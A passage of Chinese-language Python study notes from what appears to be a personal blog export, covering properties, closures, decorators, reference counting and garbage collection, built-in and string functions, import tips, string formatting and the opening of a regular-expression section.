Python中的属性是分层定义的，比如这里分为object/bird/chick/summer这四层。当我们需要调用某个属性的时候，Python会一层层向上遍历，直到找到那个属性。(某个属性可能出现在不同的层被重复定义，Python向上的过程中，会选取先遇到的那一个，也就是比较低层的属性定义)。



上面的情况中，我们已经知道了summer对象的类为chick，而chick类的父类为bird。如果只有一个对象，而不知道它的类以及其他信息的时候，**我们可以利用`__class__`属性找到对象的类，然后调用类的`__base__`属性来查询父类**

```python
print(summer.__class__) # chick 查询对象所属的类    <class '__main__.chick'>
print(chick.__base__)   # bird 查询父类  <class '__main__.bird'>
```

### 特性property

特性(property)。同一个对象的不同属性之间可能存在依赖关系。当某个属性被修改时，我们希望依赖于该属性的其他属性也同时变化。这时，我们不能通过__dict__的方式来静态的储存属性。Python提供了多种即时生成属性的方法。其中一种称为特性(property)。

特性使用**内置函数property()**来创建。

```python
class bird(object):
    feather = True
class chicken(bird):
    fly = False
    def __init__(self,age):
        self.age = age
    def getAdlut(self):
        if self.age > 1.0 : return True
        else: return False
    adult = property(getAdlut)      # 建立特性

summer = chicken(2)
print(summer.adult) # True
summer.age = 0.4
print(summer.adult) # False
```



property()最多可以加载**四个参数**。前三个参数为函数，分别用于处理查询特性、修改特性、删除特性。最后一个参数为特性的文档，可以为一个字符串，起说明作用。

```python
class num(object):
    def __init__(self,value):
        self.value = value
    def getNeg(self):
        return -self.value
    def setNeg(self,value):
        self.value = -value
    def delNeg(self):
        print('value also deleted')
        del self.value
    neg = property(getNeg, setNeg, delNeg)

x = num(1.1)    # 生成对象
print(x.value)  # 访问属性  1.1
print(x.neg)    # 访问特性,动态修改为 -1.1
x.neg = -22     # 设置特性
print(x.value)  # 访问特性, 动态修改为 22
del x.neg       # 删除特性
print(x.value)  # 访问特性报错: 'num' object has no attribute 'value'
```

### 使用特殊方法`__getattr__`

我们可以用`__getattr__(self, name)`来查询即时生成的属性。当我们查询一个属性时，如果通过`__dict__`方法无法找到该属性，那么Python会调用对象的`__getattr__`方法，来即时生成该属性。

```python
class bird(object):
    feather = True
class chicken(bird):
    fly = False
    def __init__(self,age):
        self.age = age
    def __getattr__(self, item):
        if item == 'adult':
            if self.age >= 1.0:return True
            else:return False
        else: raise AttributeError(item)

summer = chicken(2)
print(summer.adult)     # 访问不存在的特性adult,进入__getattr__  True
summer = chicken(0.5)
print(summer.adult)     # 访问不存在的特性adult,进入__getattr__  False
print(summer.weight)    # 报错 AttributeError: weight
```

每个特性需要有自己的处理函数，而`__getattr__`可以将所有的即时生成属性放在同一个函数中处理。`__getattr__`可以根据函数名区别处理不同的属性。比如上面我们查询属性名weight的时候，raise AttributeError。

> Python中还有一个`__getattribute__`特殊方法，用于查询任意属性。`__getattr__`只能用来查询不在`__dict__`系统中的属性
>
> `__setattr__(self, name, value)`和`__delattr__(self, name)`可用于修改和删除属性。它们的应用面更广，可用于任意属性。

## 闭包

### 函数对象的作用域

和其他对象一样，函数对象也有其存活的范围，也就是函数对象的**作用域**。函数对象是使用def语句定义的，函数对象的作用域与def所在的层级相同。

```python
def line_conf():
    def line(x):
        return 2*x+1
    print(line(5))

line_conf()     # 11
print(line(5))  # NameError: name 'line' is not defined 说明这时已经在作用域之外。
```

> 如果使用lambda定义函数，那么函数对象的作用域与lambda所在的层级相同。

### 闭包

函数是一个对象，所以可以作为某个函数的**返回结果**。

```python
def line_conf():
    def line(x):
        return 2*x+1
    return line

my_line = line_conf()
print(my_line(5))   # 11
```



引用了**外部的变量** 

```python
def line_conf1():
    b=15    # 环境变量, 函数对象定义时可供参考的b值
    def line(x):
        return 2*x+b
    return line

b = 5
my_line = line_conf1()
print(my_line(5))   # 25 line所参照的b值是函数对象定义时可供参考的b值15，而不是使用时的b值5。
```



一个函数和它的环境变量合在一起，就构成了一个**闭包(closure)** , 即闭包是一个包含有环境变量取值的函数对象。环境变量取值被保存在函数对象的`__closure__`属性中。

```python
def line_conf1():
    b=15    # 环境变量, 函数对象定义时可供参考的b值
    def line(x):
        return 2*x+b
    return line

my_line = line_conf1()

closure_tuple = my_line.__closure__
print(closure_tuple)	# (<cell at 0x01BAE580: int object at 0x5F8EE890>,)
print(closure_tuple[0].cell_contents) # 15
# __closure__里包含了一个元组(tuple)。
# 这个元组中的每个元素是cell类型的对象。
# 第一个cell包含的就是整数15，也就是创建闭包时的环境变量b的取值。
```

![image-20220610191532084](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/93e4e2b856d82e01fc874ba262dcb822-887b40f.png)

### 闭包与并行运算

闭包有效的减少了函数所需定义的参数数目。这对于并行运算来说有重要的意义。

在并行运算的环境下，我们可以让每台电脑负责一个函数，然后将一台电脑的输出和下一台电脑的输入串联起来。最终，我们像流水线一样工作，从串联的电脑集群一端输入数据，从另一端输出数据。这样的情境最适合只有一个参数输入的函数。闭包就可以实现这一目的。正适合函数式编程。

## 装饰器 decorator

装饰器可以**对一个函数、方法或者类进行加工** 

### 装饰函数和方法

使用场景: 在原有功能上新增需求

```python
# 原代码
def square_sum(a,b):
    return a**2+b**2
def square_diff(a,b):
    return a**2-b**2
print(square_sum(3,4))
print(square_diff(3,4))

# 修改上述函数为从提示输入数据
def square_sum_input(a,b):
    print('input:',a,b)
    return a**2 + b**2
def square_diff_input(a,b):
    print('input:',a,b)
    return a**2 - b**2
print(square_sum_input(3,4))
print(square_diff_input(3,4))
```

```python
# 使用装饰器实现修改
def decorator1(F):
    def new_F(a,b):
        print('input:',a,b)
        return F(a,b)
    return new_F

@decorator1
def square_sum_input_d(a,b):
    return a**2+b**2

@decorator1
def square_diff_input_d(a,b):
    return a**2-b**2

print(square_sum_input_d(3,4))
print(square_diff_input_d(3,4))

# 相当于:
# square_sum_d = decorator1(square_sum_input_d)
# square_sum_d(3, 4)
```

装饰器可以用def的形式定义，如上面代码中的decorator。装饰器接收一个可调用对象作为输入参数，并返回一个新的可调用对象。装饰器新建了一个可调用对象，也就是上面的new_F。new_F中，我们**增加了打印的功能**，并通过调用F(a, b)来**实现原有函数**的功能。

如果我们有其他的类似函数，我们可以继续调用decorator来修饰函数，而不用重复修改函数或者增加新的封装。这样，我们就提高了程序的可重复利用性，并增加了程序的可读性。

### 含参的装饰器

在上面的装饰器调用中，比如`@decorator`，该装饰器默认它后面的函数是唯一的参数。装饰器的语法允许调用decorator时，提供其它参数，比如`@decorator(a)`。这样，就为装饰器的编写和使用提供了更大的灵活性。

```python
def pre_str(pre = ''):
    def decorator(F):
        def new_F(a,b):
            print(pre+' input:',a,b)
            return F(a,b)
        return new_F
    return decorator

@pre_str('-_-')
def square_sum_p(a,b):
    return a**2+b**2

print(square_sum_p(3,4))    #-_- input: 3 4   25
# 相当于
# square_sum_p1 = pre_str('-_-') (square_sum_p)
# print(square_sum_p1(3,4))
```

上面的`pre_str`是允许参数的装饰器。它实际上是对原有装饰器的一个函数封装，并返回一个装饰器。我们可以将它理解为一个含有环境参量的闭包。当我们使用`@pre_str('-_-')`调用的时候，Python能够发现这一层的封装，并把参数传递到装饰器的环境中。

### 装饰类

在Python 2.6以后，装饰器被拓展到类。一个装饰器可以接收一个类，并返回一个类，从而起到加工类的效果。

```python
def ClassDecorator(aClass):
    class newClass:
        def __init__(self,age):
            self.called_time = 0
            self.call_class = aClass(age)
        def dis(self):
            self.called_time += 1
            print('have been called ', self.called_time, 'times')
            self.call_class.display()
    return newClass

@ClassDecorator
class Bird:
    def __init__(self,age):
        self.age = age
    def display(self):
        print('bird age is:',self.age)

bird = Bird(5)
for i in range(3):
    bird.dis()   # have been called  1 times    bird age is: 5      * 3
```

在decorator中，我们返回了一个新类newClass。在新类中，我们记录了原来类生成的对象（self.call_class），并附加了新的属性called_time，用于记录调用display的次数。我们也同时更改了display方法。

## 内存管理

### 对象的内存使用

为了探索对象在内存的存储，可以求助于Python的内置函数`id()`。它用于返回对象的身份(identity)

```python
a = 1   # 整数1为一个对象。而a是一个引用。
print(id(a))    	# 1603200944  内存地址的十进制表示
print(hex(id(a)))   # 0x5f8ee7b0 内存地址的十六进制表示
```

整数和短小的字符，Python都会缓存这些对象，以便重复使用。

当我们创建多个等于1的引用时，实际上是让所有这些引用指向同一个对象。

```python
b = 1
print(id(a))    # 1603200944
print(id(b))    # 1603200944
# 可见a和b实际上是指向同一个对象的两个引用
```

为了检验两个引用指向同一个对象，我们可以用is关键字。is用于判断两个引用所指的对象是否相同。

```python
a = 1
b = 1
print(a is b)   # True
a = 'good'
b = 'good'
print(a is b)   # True
a = 'today is a good day!, isnt it'
b = 'today is a good day!, isnt it'
print(a is b)   # True
a = []
b = []
print(a is b)   # False
# 长的字符串和其它对象可以有多个相同的对象，可以使用赋值语句创建出新的对象。
```



在Python中，每个对象都有存有指向该对象的引用总数，即**引用计数**(reference count)。

我们可以使用sys包中的getrefcount()，来查看某个对象的引用计数

需要注意的是，当使用某个引用作为参数，传递给getrefcount()时，参数实际上创建了一个临时的引用。因此，getrefcount()所得到的结果，会比期望的多1。

```python
from sys import getrefcount
a = [1,2,3]
print(getrefcount(a))   # 2
b = a
print(getrefcount(a))   # 3
print(getrefcount(b))   # 3
```

### 对象引用对象

Python的一个容器对象(container)，比如表、词典等，可以包含多个对象。实际上，容器对象中包含的并不是元素对象本身，是指向各个元素对象的引用。

也可以自定义一个对象，并引用其它对象:

```python
class from_obj(object):
    def __init__(self,to_object):
        self.to_object = to_object

b = [1,2,3]
a = from_obj(b)
print(id(a.to_object))  # 20977608
print(id(b))            # 20977608
print(a.to_object is b) # True 可以看到，a引用了对象b。
```



**对象引用对象**，是Python最基本的构成方式。

即使是a = 1这一赋值方式，实际上是让词典的一个键值"a"的元素引用整数对象1。

该词典对象用于记录所有的全局引用。该词典引用了整数对象1。

我们可以通过内置函数`globals()`来查看该词典。

当一个对象A被另一个对象B引用时，A的引用计数将增加1。

```python
a = 1
print(globals()['a'])   # 1

from sys import getrefcount
a = [1,2,3]
print(getrefcount(a))   # 2
b = [1,2,a,a]
print(getrefcount(a))   # 4
```



容器对象的引用可能构成很复杂的**拓扑结构**。我们可以用objgraph包来绘制其引用关系，objgraph是Python的一个第三方包。安装之前需要安装xdot

```
# pip install xdot  &&  pip install objgraph
# 下载graphviz  https://www.graphviz.org/download/
```

```python
x = [1,2,3]
y = [x,dict(key1=x)]
z = [y,(x,y)]
import objgraph
objgraph.show_refs([z],filename='ref.png')  # Image generated as ref.png
```

![image-20220610194259663](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fecc7c9dece0b19a20524fe0c1d2ccb1-4369bca.png)

![image-20220610194323329](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2e6d736aefc7f3da968c6d3a27d28594-83908f1.png)



两个对象可能**相互引用**，从而构成所谓的**引用环**(reference cycle)。引用环会给垃圾回收机制带来很大的麻烦

```python
import objgraph
a = []
b = [a]
a.append(b)
objgraph.show_refs([a],filename='ref.png')
```

![image-20220610194515112](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b8d6f223bd7b18836e90a5f08a25a543-3dbf4ae.png)

即使是一个对象，只需要自己引用自己，也能构成引用环。

```python
import objgraph
a = []
a.append(a)
objgraph.show_refs([a],filename='ref.png')
```

![image-20220610194620208](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1adab673e56ef86c93cef43290a45338-5a3d6ad.png)

### 引用减少

某个对象的引用计数可能减少。比如，可以使用del关键字删除某个引用:

```python
a = [1,2,3]
b = a
from sys import getrefcount
print(getrefcount(b))   # 3
del a
print(getrefcount(b))   # 2
```

```python
# 如果某个引用指向对象A，当这个引用被重新定向到某个其他对象B时，对象A的引用计数减少:
c = [1,2,3]
d = c
from sys import getrefcount
print(getrefcount(d))   # 3
c = 1
print(getrefcount(d))   # 2
```

### 垃圾回收

当Python的某个对象的引用计数降为0时，说明没有任何引用指向该对象，该对象就成为要被回收的垃圾了。

Python只会在特定条件下，自动启动垃圾回收

运行时记录其中分配对象(object allocation)和取消分配对象(object deallocation)的次数。

当两者的差值高于某个阈值时，垃圾回收才会启动。

可以通过gc模块的get_threshold()方法，查看该阈值:

```python
import gc
print(gc.get_threshold())   # (700, 10, 10)
# 700即是垃圾回收启动的阈值。可以通过gc中的set_threshold()方法重新设置。
# gc.set_threshold(700,10,5)
# 我们也可以手动启动垃圾回收，即使用gc.collect()。
```

### 分代回收

```
# 分代(generation)回收的策略。这一策略的基本假设是，存活时间越久的对象，越不可能在后面的程序中变成垃圾。
# Python将所有的对象分为0，1，2三代。所有的新建对象都是0代对象。当某一代对象经历过垃圾回收，依然存活，那么它就被归入下一代对象。
# 垃圾回收启动时，一定会扫描所有的0代对象。如果0代经过一定次数垃圾回收，那么就启动对0代和1代的扫描清理。
# 当1代也经历了一定次数的垃圾回收后，那么会启动对0，1，2，即对所有对象进行扫描。
# get_threshold()返回的(700, 10, 10)返回的两个10。
# 也就是说，每10次0代垃圾回收，会配合1次1代的垃圾回收；而每10次1代的垃圾回收，才会有1次的2代垃圾回收。
# 同样可以用set_threshold()来调整，比如对2代对象进行更频繁的扫描。
```

```python
import gc
gc.set_threshold(700,10,5)
print(gc.get_threshold())	# (700, 10, 5)
```

### 孤立的引用环

引用环的存在会给上面的垃圾回收机制带来很大的困难。

这些引用环可能构成无法使用，但引用计数不为0的一些对象。

```python
from sys import getrefcount
a = []
b = [a]
a.append(b)
print(getrefcount(b))   # 3
del a
del b
import gc
print(gc.collect())     #2
```

先创建了两个表对象，并引用对方，构成一个引用环。删除了a，b引用之后，这两个对象不可能再从程序中调用，就没有什么用处了。但是由于引用环的存在，这两个对象的引用计数都没有降到0，不会被垃圾回收。

![img](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4cba1b0d215f610d787a0c5ff4808510-d07b61f.png)

为了回收这样的引用环，Python复制每个对象的引用计数，可以记为gc_ref。假设，每个对象i，该计数为gc_ref_i。Python会遍历所有的对象i。对于每个对象i引用的对象j，将相应的gc_ref_j减1。

![img](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/13a2601722db596a36cba18589875f89-b102a08.png)

在结束遍历后，gc_ref不为0的对象，和这些对象引用的对象，以及继续更下游引用的对象，需要被保留。而其它的对象则被垃圾回收。]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python04补充</title>
    <url>/2022/03/21/Python/Python04%E8%A1%A5%E5%85%85/</url>
    <content><![CDATA[
# Python补充

## 内建函数

### 序列sequence

下面的内建函数(built-in function)**可用于序列(列表，元组，字符串)**：

```python
s = (1,2,3,4,False)

print(len(s))   #5
# 返回可迭代对象的长度（元素的个数）。
# 参数可以是序列（如字符串，字节，元组，列表或者范围）或者集合（如字典，集合或者固定集合）。

print(min(s))   #False
# 返回可迭代的对象中的最小的元素，或者返回2个或多个参数中的最小的参数。

print(max(s))   #4
# 返回可迭代的对象中的最大的元素，或者返回2个或多个参数中的最大的参数。

print(all(s))   # False
# 如果可迭代对象的所有元素为真（或者iterable为空）， 返回True。

print(any(s))   # True
# 如果可迭代对象的任一元素为真，返回True。

print(s.count(2))   # 1
# 返回： x在s中出现的次数

print(s.index(False))   # 4
# 返回： x在s中第一次出现的下标
```

由于元组的元素不可变更，下面方法**只适用于列表**：

```python
# 这些方法都是在原来的列表的上进行操作，会对原来的列表产生影响，而不是返回一个新表
l2 = [1,2,3]
l3 = ['a','b','c']

l2.extend(l3)
# 在表l2的末尾添加表l3的所有元素
print(l2)       # [1, 2, 3, 'a', 'b', 'c']

l2.append('na')
# 在l2的末尾附加元素
print(l2)       # [1, 2, 3, 'na']

l2.sort()
# 对l2中的元素排序
print(l2)       # [1, 2, 3]

l2.reverse()
# 将l中的元素逆序
print(l2)       # [3, 2, 1]

poped = l2.pop()
# 返回表l2的最后一个元素，并在表l2中删除该元素
print(poped)    # 3
print(l2)       # [1, 2]

del l2[2]
# 删除列表l2中下标为2的元素
print(l2)       # [1, 2]
```

### 字符串string

下面是一些**用于字符串的方法**。尽管字符串是定值表的特殊的一种，但字符串(string)类有一些方法是改变字符串的。这些方法的本质不是对原有字符串进行操作，而是建立一个新的字符串，所以并不与定值表的特点相矛盾。

```python

str = 'who is your daddy?'
sub = 'o'
width = 4

print(str.count(sub))   # 2
# 返回sub在str中出现的次数

print(str.find(sub))    # 2
print(str.find('mom'))   # -1
# 返回从左开始，查找sub在str中第一次出现的位置。如果str中不包含sub，返回 -1

print(str.index(sub))   # 2
# print(str.index('mom'))   # ValueError: substring not found
# 返回从左开始，查找sub在str中第一次出现的位置。如果str中不包含sub，举出错误

print(str.rfind(sub))   # 8
print(str.rfind('mom')) # -1
# 返回从右开始，查找sub在str中第一次出现的位置。如果str中不包含sub，返回 -1

print(str.rindex(sub))  # 8
# print(str.rindex('mom'))    #  ValueError: substring not found
# 返回从右开始，查找sub在str中第一次出现的位置。如果str中不包含sub，举出错误

print(str.isalnum())    # False
# 返回：True，如果所有的字符都是小写字母

print(str.isalpha())    # False
# 返回：True，如果所有的字符都是字母

print(str.isdigit())    # False
# 返回：True，如果所有的字符都是数字

print(str.istitle())    # False
# 返回：True，如果所有的词的首字母都是大写

print(str.isspace())    # False
# 返回：True，如果所有的字符都是空格

print(str.islower())    # True
# 返回：True，如果所有的字符都是小写字母

print(str.isupper())    # False
# 返回：True，如果所有的字符都是大写字母

print(str.split())      # ['who', 'is', 'your', 'daddy?']
print(str.split(' ',2)) # ['who', 'is', 'your daddy?']
# 返回从左开始，以空格为分割符(separator)，将str分割为多个子字符串，总共分割max次。
# 将所得的子字符串放在一个表中返回。可以str.split(',')的方式使用逗号或者其它分割符

print(str.rsplit())     # ['who', 'is', 'your', 'daddy?']
print(str.rsplit(' ',1))# ['who is your', 'daddy?']
# 返回从右开始，以空格为分割符(separator)，将str分割为多个子字符串，总共分割max次。
# 将所得的子字符串放在一个表中返回。可以str.rsplit(',')的方式使用逗号或者其它分割符

seq = ('01','02','03')
print(str.join(seq))      # 01who is your daddy?02who is your daddy?03
# 返回：将seq中的元素，以str为分割符，合并成为一个字符串。

print(str.strip())      # who is your daddy?
print(str.strip('?'))   # who is your daddy
# 返回：去掉字符串开头和结尾的空格。
# 也可以提供参数sub，去掉位于字符串开头和结尾的sub

print(str.replace(sub, 'naxx')) # whnaxx is ynaxxur daddy?
# 返回：用一个新的字符串new_sub替换str中的sub

print(str.capitalize()) # Who is your daddy?
# 返回：将str第一个字母大写

print(str.lower())  # who is your daddy?
# 返回：将str全部字母改为小写

print(str.upper())  # WHO IS YOUR DADDY?
# 返回：将str全部字母改为大写

print(str.swapcase())   # WHO IS YOUR DADDY?
# 返回：将str大写字母改为小写，小写改为大写

print(str.title())      # Who Is Your Daddy?
# 返回：将str的每个词(以空格分隔)的首字母大写

print(str.center(30))   #       who is your daddy?      ||end||
# 返回：长度为width的字符串，将原字符串放入该字符串中心，其它空余位置为空格。

print(str.ljust(30))    # who is your daddy?            ||end||
# 返回：长度为width的字符串，将原字符串左对齐放入该字符串，其它空余位置为空格。

print(str.rjust(30))    #             who is your daddy?||end||
# 返回：长度为width的字符串，将原字符串右对齐放入该字符串，其它空余位置为空格。
```

## Python小技巧

### import模块

在Python经常使用import声明，以使用其他模块(也就是其它.py文件)中定义的对象。

#### 使用`__name__`

当在运行本文件时, `__name__`的值为:'`__main__`', 引入文件中的`__name__`值为引入文件名
利用该特性, 可以保证一些测试语句在引入时不被执行

```python
# TestLib.py文件
def lib_func(a):
    return a + 10

def lib_func_another(a):
    return a + 20

if __name__ == '__main__':
    test = 101
    print(lib_func(test))

print('__name__ = ', __name__)  # 111  / __name__ =  __main__

# user.py文件
import  TestLib
print(TestLib.lib_func(120))   # 111  / __name__ =  __main__
```

#### 更多import使用方式

- `import TestLib as test`  引用TestLib模块，并将它改名为t

  ```python
  import TestLib as test
  print(test.lib_func(120))
  ```

- `from TestLib import lib_func`  只引用TestLib中的lib_func对象，并在使用时跳过TestLib引用字段

  ```python
  from TestLib import lib_func
  print(lib_func(120))
  ```

- `from TestLib import *`  引用所有TestLib中的对象，并在使用时跳过TestLib引用字段

  ```python
  from TestLib import *
  print(lib_func(120))
  ```

### 查询

#### 查询函数的参数

当我们想要知道某个函数会接收哪些参数的时候，可以使用inspect查询。

```python
def lib_func(a,b=0):
    return a + b

import inspect
print(inspect.signature(lib_func))      # (a, b=0)
print(inspect.getfullargspec(lib_func)) # FullArgSpec(args=['a', 'b'], varargs=None, varkw=None, defaults=(0,), kwonlyargs=[], kwonlydefaults=None, annotations={})

```

#### 查询对象的属性

除了使用dir()来查询对象的属性之外，我们可以使用内置函数hasattr()来确认一个对象是否具有某个属性：

```python
print(hasattr(list,'count'))    # True
```

#### 查询对象所属的类和类名称

```python
a = [1,2,2,3]
print(a.__class__)              # <class 'list'>
print(a.__class__.__name__)     # list
```

#### 查询父类

我们可以用 `__base__` 属性来查询某个类的父类：

```python
print(list.__base__)        # <class 'object'>
```

### 使用中文(以及其它非ASCII编码)

在Python程序的第一行加入`#coding=utf8` 或者 `# -*- coding: UTF-8 -*-`，例如:

```python
# coding = utf8
print('你好!')
# -*- coding: UTF-8 -*-
print('你好!')
```

### 表示2进制，8进制和16进制数字

```python
# 二进制,以0b开头
print(0b10)     # 2

# 八进制, 以0o开头
print(0o10)     # 8

# 十六进制, 以0x开头
print(0x10)     # 16
```

### 注释

一行内的注释可以以`#`开始。

多行的注释可以以`'''`开始，以`'''`结束，比如：

```python
'''
This is demo
'''

def func():
    # print something
    print("Hello world!")  # use print() function

# main
func()
```

### 搜索路径

当import的时候，Python会在搜索路径中查找模块(`module`)
可以在Python运行的时候增加或者删除`sys.path`中的元素。
另一方面，可以通过在shell中增加`PYTHONPATH`环境变量，来为Python增加搜索路径。

```python
import sys
print(sys.path)
```

```shell
# 增加/home/vamei/mylib到搜索路径中：
# 若添加到~/.bashrc中, 将长期改变搜索路径
$ export PYTHONPATH=$PYTHONPATH:/home/vamei/mylib
```

### 脚本与命令行结合

可以使用下面方法运行一个Python脚本，在脚本运行结束后，直接进入Python命令行。
这样做的好处是脚本的对象不会被清空，可以通过命令行直接调用。

```shell
$ python -i script.py
```

### 安装非标准包

- 使用Linux repository (Linux环境)

- 使用pip. pip是Python自带的包管理程序

  ```shell
  $ pip install -i [网络路径] [本地包名]    			# 安装
  $ pip uninstall web.py                			 # 卸载
  $ pip install -i [网络路径] --upgrade [本地包名]  	# 更新
  ```

  如果Python安装在一个非标准的路径(使用`$which python`来确认python可执行文件的路径)中，比如`/home/vamei/util/python/bin`中，你可以使用下面方法设置pip的安装包的路径:

  ```shell
  $ pip install -i http://mirrors.aliyuncs.com/pypi/simple --install-option="--prefix=/home/vamei/util/" web.py
  ```

- 从源码编译

## Python内置函数清单

### 数学运算

```python
# 数学运算
print(abs(-5))  # 5 取绝对值
print(round(2.4))   # 2 四舍五入取整
print(pow(2,3)) # 8 乘方,相当于2**3
print(pow(2,3,5))   # 乘方再取余,相当于2 ** 3 % 5
print(divmod(9,2))  # (4,1) 返回除法结果和余数
print(max([1,3,6,2,9])) # 9 返回最大值
print(min([1,3,6,2,9])) # 1 返回最小值
print(sum([2,-1,9,12])) # 22 求和
```

### 类型转换

```python
# 类型转换
print(int('5'))  			# 5 转换为整数
print(float(2))     		# 2 转换为浮点数
print(str(2.3))        	 	# 2.3 转换为字符串
print(type(str(2.3))) # <class 'str'>
print(complex(3,9))         # (3+9j) 转化为复数
print(type(complex(3,9))) # <class 'complex'>
print(ord('A')) 			# 65 返回字符A对应的ASCLL码
print(chr(65))  # A 返回ASCLL码对应的字符
print(bool(0))  # False 返回对应布尔值 在Python中，下列对象都相当于False:[], (), {}, 0, None, 0.0, ''
print(bin(56))  # 0b111000 返回二进制数
print(oct(56))  # 0o70 返回八进制数
print(hex(56))  # 0x38 返回十六进制数
print(list((1,2,3,4)))  # [1, 2, 3, 4] 转化为表list
print(tuple([1,2,3,4])) # (1, 2, 3, 4) 转化为元组tuple
print(dict(a=1,b='hello',c=[1,2,3]))    # {'a': 1, 'b': 'hello', 'c': [1, 2, 3]} 构建词典
```

### 序列操作

```python
# 序列操作
print(all([True,1,'hello']))    	# True 是否所有的元素都相当于True值
print(any(['',0,False,[],None]))    # False 是否有任意一个元素相当于True值
print(sorted([1,4,2,3,6]))  		# [1, 2, 3, 4, 6] 返回正序的序列
print(list(reversed([1,3,6,4,2])))  # [2, 4, 6, 3, 1] 返回反序的迭代器
```

### 类、对象、属性

```python
# 4、类、对象、属性
class Me(object):
    def test(self):
        print('hello')
def new_test():
    print('new hello')
me = Me()

print(hasattr(me,'test'))   	# True 检查me对象是否有test属性
test = getattr(me,'test')  		# 返回me的test属性
test()  # hello
setattr(me,'test',new_test)   	# 将test属性设置为new_test
me.test()   # new hello
delattr(me,"test")  			# 删除test属性
print(isinstance(me,Me))    	# True 判断me对象是否为Me类生成的对象
print(issubclass(Me,object))    # True 判断Me类是否为object类的子类
print(repr(me)) # <__main__.Me object at 0x00C8F118> 返回对象的字符串表达
```

### 编译、执行

```python
c = compile("print('hello')",'test.py','exec')	# 编译字符串成为code对象
print(c)    # <code object <module> at 0x016E33C8, file "test.py", line 1>
exec(c) 	# hello 解释字符串表达式, 参数也可以是compile()返回的code对象
exec("print('hel')")    # hel
eval(c) 	# hello 解释并执行字符串, 参数也可以是compile()返回的code对象
eval("print('hel')")    # hel
```

### 其他

```python
input = input('Please input:')  # 等待输入
print(input)
print(globals())    # 返回全局命名空间，比如全局变量名，全局函数名
print(locals())     # 返回局部命名空间
```

## 字符串格式化（%操作符）

Python中内置有对字符串进行格式化的操作`%`。

### 模板

格式化字符串时，Python使用一个字符串作为**模板**。模板中有格式符，这些**格式符**为真实值预留位置，并说明真实数值应该呈现的格式。Python用一个tuple将多个值传递给模板，每个值对应一个格式符。

在模板和tuple之间，有一个`%`号分隔，它代表了格式化操作

```python
print("I'm %s. I'm %d years old" % ('ni9ne',99))	# I'm ni9ne. I'm 99 years old
```

还可以用词典来传递真实值,命名使用()括起来。每个命名对应词典的一个key。

```python
print("I'm %(name)s. I'm %(age)d years old" % {'name':'ni9ne','age':99})
```

### 格式符

格式符为真实值预留位置，并控制显示的格式。格式符可以包含有一个**类型码**，用以控制显示的类型，如下:

```
%s    字符串 (采用str()的显示)
%r    字符串 (采用repr()的显示)
%c    单个字符
%b    二进制整数
%d    十进制整数
%i    十进制整数
%o    八进制整数
%x    十六进制整数
%e    指数 (基底写为e)
%E    指数 (基底写为E)
%f    浮点数
%F    浮点数，与上相同
%g    指数(e)或浮点数 (根据显示长度)
%G    指数(E)或浮点数 (根据显示长度)

%%    字符"%"
```

格式进行进一步的控制：

```python
%[(name)][flags][width].[precision]typecode
# 如:
print("%+10s" % 10)     #         10||end||
print("%04d" % 5)       # 0005||end||
print("%7.3f" % 2.3)    #   2.300||end||
print("%+7.3f" % 2.3)   #  +2.300||end||
print("%.*f" % (4, 1.2))#     1.2000||end||
```

```
(name)为命名
flags可以有+,-,' '或0。
	+表示右对齐。
	-表示左对齐。
	' '为一个空格，表示在正数的左侧填充一个空格，从而与负数对齐。
	0表示使用0填充。
width表示显示宽度
precision表示小数点后精度
width, precision为两个整数。可以利用*，来动态代入这两个量。
```

### 其他方式

Python3.6新增加了`格式化字符串字面值`的特性，可以方便的格式化字符串。

```python
name = 'ni9ne'
age = 99
print(f'我叫{name},今年{age}岁')		# 我叫ni9ne,今年99岁
```

### 字符串format方法

```python
print('我叫{},今年{}岁'.format('ni9ne','99'))		# 我叫ni9ne,今年99岁
print('我叫{name},今年{age}岁'.format(name='ni9ne',age='99'))		# 我叫ni9ne,今年99岁
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python05标准库</title>
    <url>/2022/03/21/Python/Python05%E6%A0%87%E5%87%86%E5%BA%93/</url>
    <content><![CDATA[
# Python标准库

Python有一套很有用的标准库(standard library)。标准库会随着Python解释器，一起安装在电脑中的。它是Python的一个组成部分。

## 正则表达式 (re包)

正则表达式(regular expression)主要功能是从**字符串**(string)中通过特定的**模式**(pattern)，**搜索**想要找到的内容。

### 语法

```
文档: https://docs.python.org/3/library/re.html
```

```python
import re
m = re.search('[0-9]','abcd5ef6ds')
print(m.group())    # 5
```

`re.search()`接收两个参数，第一个`'[0-9]'`就是正则表达式, 意为从字符串想要找的是从0到9的一个数字字符

`re.search()`如果从第二个参数找到符合要求的子字符串，就返回一个对象m，你可以通过`m.group()`的方法查看搜索到的结果。如果没有找到符合要求的字符，`re.search()`会返回None

### 正则表达式的函数

```python
# 搜索整个字符串，直到发现符合的子字符串。
m = re.search(pattern='[0-9]',string='abcd5ef6ds')
print(m.group())    # 5

# 从头开始检查字符串是否符合正则表达式。必须从字符串的第一个字符开始就相符。
m = re.match(pattern='[0-9]',string='abcd5ef6ds')
print(m)    # None

# 搜索之后将搜索到的子字符串进行替换
str = re.sub(pattern='[0-9]',repl='xx',string='abcd5ef6ds')
print(str)  # abcdxxefxxds

# 根据正则表达式分割字符串， 将分割后的所有子字符串放在一个表(list)中返回
result = re.split(pattern='[0-9]',string='abcd5ef6ds')
print(result)   # ['abcd', 'ef', 'ds']

# 根据正则表达式搜索字符串，将所有符合的子字符串放在一个表(list)中返回
result = re.findall(pattern='[0-9]',string='abcd5ef6ds')
print(result)   # ['5', '6']

# compile(), 根据包含的正则表达式的字符串创建模式对象, 以便于提高搜索效率
str = 'abcd5ef6ds'
reObj = re.compile(pattern='[0-9]')
print(reObj.split(str)) # ['abcd', 'ef', 'ds']
print(reObj.search(str).group())    # 5
```

### 写一个正则表达式

正则表达式的常用语法：

**单个字符:**

```
.          任意的一个字符
a|b        字符a或字符b
[afg]      a或者f或者g的一个字符        
[0-4]      0-4范围内的一个字符
